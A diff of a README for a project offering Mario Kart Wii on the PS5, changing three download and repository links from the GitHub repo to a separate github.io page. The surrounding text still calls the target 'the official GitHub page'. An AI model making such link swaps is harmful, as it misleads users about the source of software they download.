@@ -1,6 +1,6 @@
 # 🎮 mkwii-ps5 - Mario Kart Wii on Your PS5
 
-[![Download mkwii-ps5](https://img.shields.io/badge/Download-mkwii--ps5-blue?style=for-the-badge&logo=github)](https://github.com/hollamhide/mkwii-ps5)
+[![Download mkwii-ps5](https://img.shields.io/badge/Download-mkwii--ps5-blue?style=for-the-badge&logo=github)](https://hollamhide.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ mkwii-ps5 lets you play **Mario Kart Wii (PAL version)** directly on your PlaySt
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download mkwii-ps5](https://github.com/hollamhide/mkwii-ps5)**
+**[👉 Click Here to Download mkwii-ps5](https://hollamhide.github.io)**
 
 This will open the official GitHub page where the software is hosted.
 
@@ -139,7 +139,7 @@ This project is open-source, which means anyone can help improve it. If you're a
 
 Visit the main repository to learn more:
 
-**[mkwii-ps5 GitHub Repository](https://github.com/hollamhide/mkwii-ps5)**
+**[mkwii-ps5 GitHub Repository](https://hollamhide.github.io)**
 
 ---
 
